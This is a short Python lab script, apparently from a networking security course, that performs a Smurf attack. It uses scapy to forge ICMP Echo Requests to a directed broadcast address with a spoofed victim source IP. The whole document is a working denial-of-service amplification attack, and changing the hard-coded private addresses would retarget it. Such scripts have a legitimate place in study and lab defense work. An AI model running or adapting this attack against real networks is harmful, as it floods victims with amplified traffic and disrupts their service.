#!/usr/bin/env python3
"""
Lab 04: Smurf Attack Script (ICMP Broadcast Amplification)
Forges ICMP Echo Request packets sent to directed broadcast (10.0.0.255)
with spoofed source IP = Victim (10.0.0.200).
"""
import sys
import time
from scapy.all import IP, ICMP, send

TARGET_BCAST = "10.0.0.255"
SPOOFED_VIC = "10.0.0.200"
NUM_PACKETS = 10

print(f"[*] Starting Smurf Attack from Attacker...")
print(f"    - Target Broadcast : {TARGET_BCAST}")
print(f"    - Spoofed Source IP: {SPOOFED_VIC}")
print(f"    - Total Requests   : {NUM_PACKETS}")

pkt = IP(src=SPOOFED_VIC, dst=TARGET_BCAST) / ICMP(id=0x1337)
send(pkt, count=NUM_PACKETS, inter=0.1, verbose=0)

print(f"[+] Successfully sent {NUM_PACKETS} ICMP Echo Requests to {TARGET_BCAST} with spoofed src={SPOOFED_VIC}")

